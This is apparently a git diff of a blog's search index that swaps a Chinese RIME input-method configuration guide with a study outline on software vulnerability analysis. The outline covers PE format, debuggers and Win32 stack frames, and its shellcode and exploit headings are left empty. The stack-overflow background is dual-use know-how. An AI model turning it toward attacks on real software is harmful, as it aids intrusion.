+<li>微软安全中心”Black Tuesday“：每个月第二周星期二发布补丁</li>
+</ol>
+</li>
+<li><strong>PE文件格式</strong>：Win32平台下可执行文件遵守的数据格式（“*.exe” &#x2F; “*.dll”等）<ol>
+<li>.text：由编译器产生，存放二进制的机器码，是反汇编和调试的对象</li>
+<li>.data：初始化的数据块（如：宏定义、全局变量、静态变量等）</li>
+<li>.idata：可执行文件所使用的动态链接库等外来函数与文件的信息</li>
+<li>.rsrc：存放程序的资源（如图标、菜单等）</li>
+<li>.reloc 、.edata 、.tls 、.rdata</li>
+</ol>
+</li>
+<li><strong>“虚拟内存”</strong>（非操作系统中的虚拟内存）：在用户模式下，用调试器看到的内存地址 [指Windows用户态内存隐射机制下的虚拟内存]</li>
+<li><strong>PE文件与虚拟内存的映射</strong>：VA &#x3D; ImageBase + RVA<ol>
+<li>文件偏移地址（File Offset）</li>
+<li>装载基址（Image Base）</li>
+<li>虚拟内存地址（Virtual Address,VA）</li>
+<li>相对虚拟地址（Relative Virtual Address,RVA）</li>
 </ol>
 </li>
 </ol>
-<p>2.特殊字符定义：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;recognizer/patterns/punct&#x27;</span>: <span class="string">&quot;^/[a-z]*$&quot;</span>  <span class="comment">#可以使symbols中的‘/hj’‘/fh’等命令</span></span><br><span class="line"><span class="string">&#x27;punctuator/import_preset&#x27;</span>: symbols       <span class="comment">#将标点设置默认为&#x27;symbols.yaml&#x27;文件</span></span><br><span class="line"><span class="string">&quot;switches/@0/reset&quot;</span>: <span class="number">1</span>  <span class="comment"># 初始的 ascii mode 设置为「西文」</span></span><br></pre></td></tr></table></figure>
-<ol start="3">
-<li>糢糊音定义：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;speller/algebra&#x27;</span>:</span><br><span class="line">    - erase/^xx$/                      <span class="comment"># 第一行保留</span></span><br><span class="line">    <span class="comment"># 模糊音定義</span></span><br><span class="line">    <span class="comment"># 需要哪組就刪去行首的 # 號，單雙向任選</span></span><br><span class="line">    <span class="comment">#- derive/^([zcs])h/$1/             # zh, ch, sh =&gt; z, c, s</span></span><br><span class="line">    <span class="comment">#- derive/^([zcs])([^h])/$1h$2/     # z, c, s =&gt; zh, ch, sh</span></span><br><span class="line">    <span class="comment">#- derive/^n/l/                     # n =&gt; l</span></span><br><span class="line">    <span class="comment">#- derive/^l/n/                     # l =&gt; n</span></span><br><span class="line">    <span class="comment"># 這兩組一般是單向的</span></span><br><span class="line">    <span class="comment">#- derive/^r/l/                     # r =&gt; l</span></span><br><span class="line">    <span class="comment">#- derive/^ren/yin/                 # ren =&gt; yin, reng =&gt; ying</span></span><br><span class="line">    <span class="comment">#- derive/^r/y/                     # r =&gt; y</span></span><br><span class="line">    <span class="comment"># 下面 hu &lt;=&gt; f 這組寫法複雜一些，分情況討論</span></span><br><span class="line">    <span class="comment">#- derive/^hu$/fu/                  # hu =&gt; fu</span></span><br><span class="line">    - derive/^hong$/feng/              <span class="comment"># hong =&gt; feng</span></span><br><span class="line">    - derive/^hu([<span class="keyword">in</span>])$/fe$<span class="number">1</span>/          <span class="comment"># hui =&gt; fei, hun =&gt; fen</span></span><br><span class="line">    <span class="comment">#- derive/^hu([ao])/f$1/            # hua =&gt; fa, ...</span></span><br><span class="line">    <span class="comment">#- derive/^fu$/hu/                  # fu =&gt; hu</span></span><br><span class="line">    - derive/^feng$/hong/              <span class="comment"># feng =&gt; hong</span></span><br><span class="line">    <span class="comment">#- derive/^fe([in])$/hu$1/          # fei =&gt; hui, fen =&gt; hun</span></span><br><span class="line">    <span class="comment">#- derive/^f([ao])/hu$1/            # fa =&gt; hua, ...</span></span><br><span class="line">    <span class="comment"># 韻母部份</span></span><br><span class="line">    <span class="comment">#- derive/^([bpmf])eng$/$1ong/      # meng = mong, ...</span></span><br><span class="line">    - derive/([ei])n$/$1ng/            <span class="comment"># en =&gt; eng, in =&gt; ing</span></span><br><span class="line">    - derive/([ei])ng$/$1n/            <span class="comment"># eng =&gt; en, ing =&gt; in</span></span><br><span class="line">    - derive/^un/iong/                 <span class="comment"># un =&gt; iong</span></span><br><span class="line">    - derive/^iong/un/                 <span class="comment"># iong =&gt; un</span></span><br><span class="line">    <span class="comment"># 樣例足夠了，其他請自己總結……</span></span><br><span class="line">    <span class="comment"># 反模糊音？</span></span><br><span class="line">    <span class="comment"># 誰說方言沒有普通話精確、有模糊音，就能有反模糊音。</span></span><br><span class="line">    <span class="comment"># 示例爲分尖團的中原官話：</span></span><br><span class="line">    <span class="comment">#- derive/^ji$/zii/   # 在設計者安排下鳩佔鵲巢，尖音i只好雙寫了</span></span><br><span class="line">    <span class="comment">#- derive/^qi$/cii/</span></span><br><span class="line">    <span class="comment">#- derive/^xi$/sii/</span></span><br><span class="line">    <span class="comment">#- derive/^ji/zi/</span></span><br><span class="line">    <span class="comment">#- derive/^qi/ci/</span></span><br><span class="line">    <span class="comment">#- derive/^xi/si/</span></span><br><span class="line">    <span class="comment">#- derive/^ju/zv/</span></span><br><span class="line">    <span class="comment">#- derive/^qu/cv/</span></span><br><span class="line">    <span class="comment">#- derive/^xu/sv/</span></span><br><span class="line">    <span class="comment"># 韻母部份，只能從大面上覆蓋</span></span><br><span class="line">    <span class="comment">#- derive/^([bpm])o$/$1eh/          # bo =&gt; beh, ...</span></span><br><span class="line">    <span class="comment">#- derive/(^|[dtnlgkhzcs]h?)e$/$1eh/  # ge =&gt; geh, se =&gt; sheh, ...</span></span><br><span class="line">    <span class="comment">#- derive/^([gkh])uo$/$1ue/         # guo =&gt; gue, ...</span></span><br><span class="line">    <span class="comment">#- derive/^([gkh])e$/$1uo/          # he =&gt; huo, ...</span></span><br><span class="line">    <span class="comment">#- derive/([uv])e$/$1o/             # jue =&gt; juo, lve =&gt; lvo, ...</span></span><br><span class="line">    <span class="comment">#- derive/^fei$/fi/                 # fei =&gt; fi</span></span><br><span class="line">    <span class="comment">#- derive/^wei$/vi/                 # wei =&gt; vi</span></span><br><span class="line">    <span class="comment">#- derive/^([nl])ei$/$1ui/          # nei =&gt; nui, lei =&gt; lui</span></span><br><span class="line">    <span class="comment">#- derive/^([nlzcs])un$/$1vn/       # lun =&gt; lvn, zun =&gt; zvn, ...</span></span><br><span class="line">    <span class="comment">#- derive/^([nlzcs])ong$/$1iong/    # long =&gt; liong, song =&gt; siong, ...</span></span><br><span class="line">    <span class="comment"># 這個辦法雖從拼寫上做出了區分，然而受詞典制約，候選字仍是混的。</span></span><br><span class="line">    <span class="comment"># 只有真正的方音輸入方案纔能做到！但「反模糊音」這個玩法快速而有效！</span></span><br><span class="line">    <span class="comment"># 模糊音定義先於簡拼定義，方可令簡拼支持以上模糊音</span></span><br><span class="line">    - abbrev/^([a-z]).+$/$<span class="number">1</span>/           <span class="comment"># 簡拼（首字母）</span></span><br><span class="line">    - abbrev/^([zcs]h).+$/$<span class="number">1</span>/          <span class="comment"># 簡拼（zh, ch, sh）</span></span><br><span class="line">    <span class="comment"># 以下是一組容錯拼寫，《漢語拼音》方案以前者爲正</span></span><br><span class="line">    - derive/^([nl])ve$/$1ue/          <span class="comment"># nve = nue, lve = lue</span></span><br><span class="line">    - derive/^([jqxy])u/$1v/           <span class="comment"># ju = jv,</span></span><br><span class="line">    - derive/un$/uen/                  <span class="comment"># gun = guen,</span></span><br><span class="line">    - derive/ui$/uei/                  <span class="comment"># gui = guei,</span></span><br><span class="line">    - derive/iu$/iou/                  <span class="comment"># jiu = jiou,</span></span><br><span class="line">    <span class="comment"># 自動糾正一些常見的按鍵錯誤</span></span><br><span class="line">    - derive/([aeiou])ng$/$1gn/        <span class="comment"># dagn =&gt; dang</span></span><br><span class="line">    - derive/([dtngkhrzcs])o(u|ng)$/$1o/  <span class="comment"># zho =&gt; zhong|zhou</span></span><br><span class="line">    - derive/ong$/on/                  <span class="comment"># zhonguo =&gt; zhong guo</span></span><br><span class="line">    - derive/ao$/oa/                   <span class="comment"># hoa =&gt; hao</span></span><br><span class="line">    - derive/([iu])a(o|ng?)$/a$<span class="number">1</span>$<span class="number">2</span>/    <span class="comment"># tain =&gt; tian</span></span><br><span class="line">  <span class="comment"># 分尖團後 v =&gt; ü 的改寫條件也要相應地擴充：</span></span><br><span class="line">  <span class="comment">#&#x27;translator/preedit_format&#x27;:</span></span><br><span class="line">  <span class="comment">#  - &quot;xform/([nljqxyzcs])v/$1ü/&quot;</span></span><br></pre></td></tr></table></figure></li>
+<h2 id="逆向分析工具"><a href="#逆向分析工具" class="headerlink" title="逆向分析工具"></a>逆向分析工具</h2><ol>
+<li><p>OllyDbg</p>
+</li>
+<li><p>SoftICE</p>
+</li>
+<li><p>WinDbg</p>
+</li>
+<li><p>IDE Pro</p>
+</li>
+<li><p>二进制编辑器（Ultra Edit、Hex Workshop、WinHex）</p>
+</li>
+<li><p>虚拟机</p>
+</li>
+<li><p>Crack二进制文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//密码验证实验程序</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int verify_password(char *password)</span><br><span class="line">&#123;</span><br><span class="line">   int authenticated;</span><br><span class="line">   authenticated=strcmp(password,PASSWORD);</span><br><span class="line">   return authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">   int valid_flag = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
 </ol>
-]]></content>
+<h1 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h1><h2 id="栈溢出利用"><a href="#栈溢出利用" class="headerlink" title="栈溢出利用"></a>栈溢出利用</h2><h3 id="1-系统栈"><a href="#1-系统栈" class="headerlink" title="1. 系统栈"></a>1. 系统栈</h3><ol>
+<li><h4 id="进程使用的内存区域按功能划分"><a href="#进程使用的内存区域按功能划分" class="headerlink" title="进程使用的内存区域按功能划分"></a>进程使用的内存区域<strong>按功能</strong>划分</h4><ol>
+<li>代码区：cpu在此区域取值执行</li>
+<li>数据区：存储全局变量等</li>
+<li>堆区：动态分配和回收。进程在堆区请求一定大小的内存</li>
+<li>栈区：用于动态地存储函数间的调用关系，保证被调用函数在返回时恢复到母函数继续执行。</li>
+</ol>
+</li>
+<li><h4 id="Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧"><a href="#Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧" class="headerlink" title="Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧"></a>Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧</h4><ol>
+<li>ESP（<a href="extended_stack_pointer" title="extended_stack_pointer">栈指针寄存器</a>）：存放一个永远指向系统栈<strong>最上面一个栈帧的顶部</strong></li>
+<li>EBP（<a href="extended_base_pointer" title="extended_base_pointer">基址指针寄存器</a>）：存放一个永远指向系统栈<strong>最上面一个栈帧的底部</strong></li>
+<li>当前函数栈帧：ESP和EBP之间的内存空间<ol>
+<li>局部变量：为函数局部变量开辟内存空间</li>
+<li>栈帧状态值：保存前栈帧的顶部和底部，用于本栈帧弹出后恢复上一个栈帧（实际只保存底部，顶部可以通过堆栈平衡计算得出）</li>
+<li>函数返回地址：保存当前函数调用前的断点信息，也就是<strong>函数调用前的指令位置</strong></li>
+</ol>
+</li>
+<li>另外的特殊寄存器：EIP（指令寄存器）存放下一条等待执行的指令地址</li>
+</ol>
+</li>
+<li><h4 id="不同编译器调用方式差异"><a href="#不同编译器调用方式差异" class="headerlink" title="不同编译器调用方式差异"></a>不同编译器调用方式差异</h4></li>
+</ol>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>C</th>
+<th>SysCall</th>
+<th>StdCall</th>
+<th>BASIC</th>
+<th>FORTRAN</th>
+<th>PASCAL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>参数入栈顺序</td>
+<td>右-&gt;左</td>
+<td>右-&gt;左</td>
+<td>右-&gt;左</td>
+<td>左-&gt;右</td>
+<td>左-&gt;右</td>
+<td>左-&gt;右</td>
+</tr>
+<tr>
+<td>恢复栈平衡操作的位置</td>
+<td>母函数</td>
+<td>子函数</td>
+<td>子函数</td>
+<td>子函数</td>
+<td>子函数</td>
+<td>子函数</td>
+</tr>
+</tbody></table>
+<ol start="4">
+<li><h4 id="函数调用大致步骤："><a href="#函数调用大致步骤：" class="headerlink" title="函数调用大致步骤："></a>函数调用大致步骤：</h4><ol>
+<li>参数入栈：按入栈顺序</li>
+<li>返回地址入栈：将当前代码区调用指令的下一条指令地址压入栈，供函数返回时继续执行</li>
+<li>代码区跳转：处理器从当前代码区跳转到被调用函数的入口</li>
+<li>栈帧调整：<ol>
+<li>EBP入栈：保存当前栈帧状态值，以供后面恢复本栈帧时使用</li>
+<li>ESP装入EBP，更新栈帧底部：将当前栈帧切换到新栈帧</li>
+<li>把ESP减去所需空间的大小，太高栈顶：给新栈帧分配空间</li>
+</ol>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;假设函数有三个参数，依次入栈</span><br><span class="line">push canshu1    </span><br><span class="line">push canshu2    </span><br><span class="line">push canshu3    </span><br><span class="line">call 函数地址    ;call完成两项工作：a.保存返回地址（入栈当前指令在内存中的位置） b. 跳转到函数的入口地址</span><br><span class="line">push ebp    ;保存旧栈的栈底</span><br><span class="line">mov ebp ,esp    ;栈帧切换：新栈帧底替换旧栈底</span><br><span class="line">sub esp ,xxx    ;太高栈顶，为新栈帧开辟内存空间：设置新栈帧的栈顶</span><br></pre></td></tr></table></figure>
+</li>
+<li><h4 id="函数返回大致步骤："><a href="#函数返回大致步骤：" class="headerlink" title="函数返回大致步骤："></a>函数返回大致步骤：</h4><ol>
+<li>保存返回值：通常保存在寄存器EAX</li>
+<li>弹出当前栈帧，恢复上一个栈帧<ol>
+<li>在堆栈平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收空间</li>
+<li>将（当前栈帧底部保存的）前栈帧EBP值 弹入 EBP寄存器，恢复出上一个栈帧</li>
+<li>将函数返回地址弹给EIP寄存器</li>
+</ol>
+</li>
+<li>跳转：按照返回地址跳回母函数继续执行</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add esp ,xxx    ;降低栈顶，回收当前栈帧</span><br><span class="line">pop ebp    ;将上一个栈帧底部位置恢复到ebp</span><br><span class="line">retn    ;两个功能：a. 弹出当前栈顶元素（栈帧中的返回地址） b.处理器跳转到弹出的返回地址，恢复调用之前的代码区</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="扩充汇编知识书籍：《IBM-X86汇编》或《Win32汇编》"><a href="#扩充汇编知识书籍：《IBM-X86汇编》或《Win32汇编》" class="headerlink" title="+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》"></a>+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》</h4><h3 id="2-修改邻接变量"><a href="#2-修改邻接变量" class="headerlink" title="2. 修改邻接变量"></a>2. 修改邻接变量</h3><h3 id="3-修改函数返回地址"><a href="#3-修改函数返回地址" class="headerlink" title="3. 修改函数返回地址"></a>3. 修改函数返回地址</h3><h3 id="4-代码植入"><a href="#4-代码植入" class="headerlink" title="4. 代码植入"></a>4. 代码植入</h3><h2 id="开发shellcode"><a href="#开发shellcode" class="headerlink" title="开发shellcode"></a>开发shellcode</h2><h2 id="MetaSploit开发Exploit"><a href="#MetaSploit开发Exploit" class="headerlink" title="MetaSploit开发Exploit"></a>MetaSploit开发Exploit</h2><h2 id="堆溢出利用"><a href="#堆溢出利用" class="headerlink" title="堆溢出利用"></a>堆溢出利用</h2><h2 id="Windows异常处理机制"><a href="#Windows异常处理机制" class="headerlink" title="Windows异常处理机制"></a>Windows异常处理机制</h2><h2 id="高级内存攻击技术"><a href="#高级内存攻击技术" class="headerlink" title="高级内存攻击技术"></a>高级内存攻击技术</h2><h2 id="手机里的缓冲区溢出"><a href="#手机里的缓冲区溢出" class="headerlink" title="手机里的缓冲区溢出"></a>手机里的缓冲区溢出</h2><h2 id="其他软件漏洞利用技术"><a href="#其他软件漏洞利用技术" class="headerlink" title="其他软件漏洞利用技术"></a>其他软件漏洞利用技术</h2><h2 id="Windows安全机制"><a href="#Windows安全机制" class="headerlink" title="Windows安全机制"></a>Windows安全机制</h2><h2 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h2><h2 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h2><h2 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h2><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><h2 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h2><h2 id="堆保护与攻击"><a href="#堆保护与攻击" class="headerlink" title="堆保护与攻击"></a>堆保护与攻击</h2><h1 id="三、漏洞挖掘"><a href="#三、漏洞挖掘" class="headerlink" title="三、漏洞挖掘"></a>三、漏洞挖掘</h1><h1 id="四、漏洞分析"><a href="#四、漏洞分析" class="headerlink" title="四、漏洞分析"></a>四、漏洞分析</h1>]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>PWN</category>
+      </categories>
       <tags>
-        <tag>tools</tag>
-        <tag>open source</tag>
+        <tag>网络空间安全</tag>
+        <tag>安全漏洞</tag>
+        <tag>0day</tag>
+        <tag>Stack overflow</tag>
       </tags>
   </entry>
   <entry>
@@ -1555,180 +1684,51 @@
       </tags>
   </entry>
   <entry>
-    <title>ODAY-软件漏洞分析</title>
-    <url>/2022/01/06/ODAY-%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<ul>
-<li><a href="#%E4%B8%80-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">一、基础知识</a><ul>
-<li><a href="#%E5%AE%9A%E4%B9%89">定义</a></li>
-<li><a href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7">逆向分析工具</a></li>
-</ul>
-</li>
-<li><a href="#%E4%BA%8C-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">二、漏洞利用</a><ul>
-<li><a href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8">栈溢出利用</a><ul>
-<li><a href="#1-%E7%B3%BB%E7%BB%9F%E6%A0%88">1. 系统栈</a><ul>
-<li><a href="#%E8%BF%9B%E7%A8%8B%E4%BD%BF%E7%94%A8%E7%9A%84%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F%E6%8C%89%E5%8A%9F%E8%83%BD%E5%88%92%E5%88%86">进程使用的内存区域按功能划分</a></li>
-<li><a href="#win32%E7%B3%BB%E7%BB%9F%E6%8F%90%E4%BE%9B%E4%BA%86%E4%B8%A4%E4%B8%AA%E7%89%B9%E6%AE%8A%E5%AF%84%E5%AD%98%E5%99%A8%E7%94%A8%E4%BA%8E%E6%A0%87%E8%AF%86%E4%BD%8D%E4%BA%8E%E7%B3%BB%E7%BB%9F%E6%A0%88%E6%A0%88%E9%A1%B6%E7%9A%84%E6%A0%88%E5%B8%A7">Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧</a></li>
-<li><a href="#%E4%B8%8D%E5%90%8C%E7%BC%96%E8%AF%91%E5%99%A8%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F%E5%B7%AE%E5%BC%82">不同编译器调用方式差异</a></li>
-<li><a href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%A4%A7%E8%87%B4%E6%AD%A5%E9%AA%A4">函数调用大致步骤：</a></li>
-<li><a href="#%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%A4%A7%E8%87%B4%E6%AD%A5%E9%AA%A4">函数返回大致步骤：</a></li>
-<li><a href="#%E6%89%A9%E5%85%85%E6%B1%87%E7%BC%96%E7%9F%A5%E8%AF%86%E4%B9%A6%E7%B1%8Dibm-x86%E6%B1%87%E7%BC%96%E6%88%96win32%E6%B1%87%E7%BC%96">+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》</a></li>
-</ul>
-</li>
-<li><a href="#2-%E4%BF%AE%E6%94%B9%E9%82%BB%E6%8E%A5%E5%8F%98%E9%87%8F">2. 修改邻接变量</a></li>
-<li><a href="#3-%E4%BF%AE%E6%94%B9%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80">3. 修改函数返回地址</a></li>
-<li><a href="#4-%E4%BB%A3%E7%A0%81%E6%A4%8D%E5%85%A5">4. 代码植入</a></li>
-</ul>
-</li>
-<li><a href="#%E5%BC%80%E5%8F%91shellcode">开发shellcode</a></li>
-<li><a href="#metasploit%E5%BC%80%E5%8F%91exploit">MetaSploit开发Exploit</a></li>
-<li><a href="#%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8">堆溢出利用</a></li>
-<li><a href="#windows%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6">Windows异常处理机制</a></li>
-<li><a href="#%E9%AB%98%E7%BA%A7%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF">高级内存攻击技术</a></li>
-<li><a href="#%E6%89%8B%E6%9C%BA%E9%87%8C%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA">手机里的缓冲区溢出</a></li>
-<li><a href="#%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF">其他软件漏洞利用技术</a></li>
-<li><a href="#windows%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6">Windows安全机制</a></li>
-<li><a href="#gs">GS</a></li>
-<li><a href="#safeseh">SafeSEH</a></li>
-<li><a href="#dep">DEP</a></li>
-<li><a href="#aslr">ASLR</a></li>
-<li><a href="#sehop">SEHOP</a></li>
-<li><a href="#%E5%A0%86%E4%BF%9D%E6%8A%A4%E4%B8%8E%E6%94%BB%E5%87%BB">堆保护与攻击</a></li>
-</ul>
-</li>
-<li><a href="#%E4%B8%89-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">三、漏洞挖掘</a></li>
-<li><a href="#%E5%9B%9B-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">四、漏洞分析</a></li>
-</ul>
-<h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><ol>
-<li>BUG：功能性逻辑缺陷</li>
-<li>漏洞：安全性逻辑缺陷（软件中缓冲区溢出漏洞、网站中跨站脚本xss漏洞、SQL注入漏洞等）</li>
-<li>0day响应：<ol>
-<li><a href="http://cve.mitre.org/" title="http://cve.mitre.org">CVE</a></li>
-<li><a href="http://www.cert.org/" title="http://www.cert.org">CERT</a></li>
-<li>微软安全中心”Black Tuesday“：每个月第二周星期二发布补丁</li>
-</ol>
-</li>
-<li><strong>PE文件格式</strong>：Win32平台下可执行文件遵守的数据格式（“*.exe” &#x2F; “*.dll”等）<ol>
-<li>.text：由编译器产生，存放二进制的机器码，是反汇编和调试的对象</li>
-<li>.data：初始化的数据块（如：宏定义、全局变量、静态变量等）</li>
-<li>.idata：可执行文件所使用的动态链接库等外来函数与文件的信息</li>
-<li>.rsrc：存放程序的资源（如图标、菜单等）</li>
-<li>.reloc 、.edata 、.tls 、.rdata</li>
-</ol>
-</li>
-<li><strong>“虚拟内存”</strong>（非操作系统中的虚拟内存）：在用户模式下，用调试器看到的内存地址 [指Windows用户态内存隐射机制下的虚拟内存]</li>
-<li><strong>PE文件与虚拟内存的映射</strong>：VA &#x3D; ImageBase + RVA<ol>
-<li>文件偏移地址（File Offset）</li>
-<li>装载基址（Image Base）</li>
-<li>虚拟内存地址（Virtual Address,VA）</li>
-<li>相对虚拟地址（Relative Virtual Address,RVA）</li>
+    <title>RIME CONFIG GUIDE</title>
+    <url>/2021/12/25/RIME-CONfIG/</url>
+    <content><![CDATA[<h1 id="x2F-rime-x2F-build-x2F-ibus-rime-yaml"><a href="#x2F-rime-x2F-build-x2F-ibus-rime-yaml" class="headerlink" title="&#x2F;rime&#x2F;build&#x2F;ibus_rime.yaml"></a>&#x2F;rime&#x2F;build&#x2F;ibus_rime.yaml</h1><p>ibus-rime候选横竖列文件</p>
+<h1 id="x2F-rime-x2F-default-custom-yaml"><a href="#x2F-rime-x2F-default-custom-yaml" class="headerlink" title="&#x2F;rime&#x2F;default.custom.yaml"></a>&#x2F;rime&#x2F;default.custom.yaml</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">patch:</span><br><span class="line">	<span class="string">&quot;menu/page_size&quot;</span>: <span class="number">7</span> <span class="comment">#每页候选词个数</span></span><br><span class="line">	<span class="string">&quot;ascii_composer/switch_key/Shift_L&quot;</span>: commit_code <span class="comment">#左shift提交字母</span></span><br><span class="line">	<span class="string">&quot;style/horizontal&quot;</span>: true      <span class="comment"># 候選橫排</span></span><br></pre></td></tr></table></figure>
+<h1 id="x2F-ibus-x2F-rime-x2F-luna-pinyin-custom-yaml"><a href="#x2F-ibus-x2F-rime-x2F-luna-pinyin-custom-yaml" class="headerlink" title="&#x2F;ibus&#x2F;rime&#x2F;luna_pinyin.custom.yaml"></a>&#x2F;ibus&#x2F;rime&#x2F;luna_pinyin.custom.yaml</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">patch:</span><br><span class="line">	switches:                   <span class="comment"># 注意縮進</span></span><br><span class="line">	- name: ascii_mode</span><br><span class="line">	reset: <span class="number">0</span>                <span class="comment"># reset 0 的作用是當從其他輸入方案切換到本方案時，</span></span><br><span class="line">	states: [ 中文, 西文 ]  <span class="comment"># 重設爲指定的狀態，而不保留在前一個方案中設定的狀態。</span></span><br><span class="line">	- name: full_shape        <span class="comment"># 選擇輸入方案後通常需要立即輸入中文，故重設 ascii_mode = 0；</span></span><br><span class="line">	states: [ 半角, 全角 ]  <span class="comment"># 而全／半角則可沿用之前方案中的用法。</span></span><br><span class="line">	- name: simplification</span><br><span class="line">	reset: <span class="number">1</span>                <span class="comment"># 增加這一行：默認啓用「繁→簡」轉換。</span></span><br><span class="line">	states: [ 漢字, 汉字 ]</span><br></pre></td></tr></table></figure>
+<h1 id="weasel-custom-yaml"><a href="#weasel-custom-yaml" class="headerlink" title="weasel.custom.yaml"></a>weasel.custom.yaml</h1><h2 id="P站配色主题风格"><a href="#P站配色主题风格" class="headerlink" title="P站配色主题风格"></a>P站配色主题风格</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">patch:</span><br><span class="line"><span class="comment"># rime输入法自定义P站配色风格主题</span></span><br><span class="line">	<span class="string">&quot;style/layout/round_corner&quot;</span>:<span class="number">5</span></span><br><span class="line">	<span class="string">&quot;style/color_scheme&quot;</span>::p</span><br><span class="line">	  <span class="string">&quot;style/horizontal&quot;</span>: true  <span class="comment">#横向排列</span></span><br><span class="line">	<span class="string">&quot;preset_color_schemes/:p&quot;</span>:</span><br><span class="line">		author:BLACK</span><br><span class="line">		name::p</span><br><span class="line">		back_color:<span class="number">0x000000</span></span><br><span class="line">		label_color:<span class="number">0xffffff</span></span><br><span class="line">		border_color:<span class="number">0x000000</span></span><br><span class="line">		text_color:<span class="number">0xffffff</span></span><br><span class="line">		hilited_text_color:<span class="number">0x000000</span></span><br><span class="line">		hilited_back_color:<span class="number">0x009bff</span></span><br><span class="line">		candidate_text_color:<span class="number">0xffffff</span></span><br><span class="line">		hilited_candidate_text_color:<span class="number">0x000000</span></span><br><span class="line">		hilited_candidate_back_color:<span class="number">0x009bff</span></span><br><span class="line">		comment_text_color:<span class="number">0xffffff</span></span><br><span class="line">		hilited_lable_color:<span class="number">0x000000</span></span><br></pre></td></tr></table></figure>
+<pre><code>• 输入法代号：ibus-rime
+• 用户资料夹： ~/.config/ibus/rime/
+• 共享资料夹： /usr/share/rime-data/
+</code></pre>
+<p>共享资料夹包含预设输入方案的源文件。 这些文件属于 Rime 所发行软件的一部份，在访问权限控制较严格的系统上对用户是只读的，因此谢绝软件版本更新以外的任何修改—— 一旦用户修改这里的文件，很可能影响后续的软件升级或在升级时丢失数据。<br>在「部署 Rime」操作时，将用到这里的输入方案源文件、并结合用户定制的内容来编译预设输入方案。</p>
+<h1 id="「用户资料夹」数据说明"><a href="#「用户资料夹」数据说明" class="headerlink" title="「用户资料夹」数据说明"></a>「用户资料夹」数据说明</h1><h2 id="用户资料夹则包含为用户准备的内容"><a href="#用户资料夹则包含为用户准备的内容" class="headerlink" title="用户资料夹则包含为用户准备的内容"></a>用户资料夹则包含为用户准备的内容</h2><pre><code>• 〔全局設定〕 default.yaml
+• 〔發行版設定〕 ibus-rime.yaml
+• 〔預設輸入方案副本〕 &lt;方案标识&gt;.schema.yaml ibus-rime.schema.yaml
+• ※〔安裝信息〕 installation.yaml
+• ※〔用戶狀態信息〕 user.yaml
+</code></pre>
+<h2 id="编译输入方案所产出的二进制文件："><a href="#编译输入方案所产出的二进制文件：" class="headerlink" title="编译输入方案所产出的二进制文件："></a>编译输入方案所产出的二进制文件：</h2><pre><code>• 〔Rime 棱鏡〕 &lt;方案标识&gt;.prism.bin
+• 〔Rime 固態詞典〕 &lt;词典名&gt;.table.bin
+• 〔Rime 反查詞典〕 &lt;词典名&gt;.reverse.bin
+</code></pre>
